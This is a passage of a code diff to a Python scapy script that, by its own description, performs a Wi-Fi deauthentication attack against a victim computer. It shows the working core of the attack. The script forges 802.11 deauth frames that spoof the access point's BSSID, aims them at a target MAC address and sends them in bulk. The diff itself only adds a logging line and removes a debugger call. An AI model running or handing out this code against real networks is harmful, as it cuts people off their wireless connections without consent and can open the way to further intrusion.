@@ -10,16 +10,19 @@ from scapy.all import (
 )
 from argparse import ArgumentParser as AP
 from sys import exit
+import logging
+
 def deauth(iface: str, count: int, bssid: str, target_mac: str):
     """
     - addr1=target_mac specifies that this packet will go to the victim's computer
     - addr2=bssid specifies the MAC address of the AP 
     - addr3=bssid is the same as addr2
     """
-    pdb.set_trace()
     dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
     frame = RadioTap()/dot11/Dot11Deauth()
+    logging.warning(f"Sending deauth: client: {target_mac}, AP: {bssid}")
     sendp(frame, iface=iface, count=count, inter=0.100)
+
 if __name__ == "__main__":
     parser = AP(description="Perform Deauthentication attack against a computer")
     parser.add_argument("-i", "--interface",help="interface to send deauth packets from")
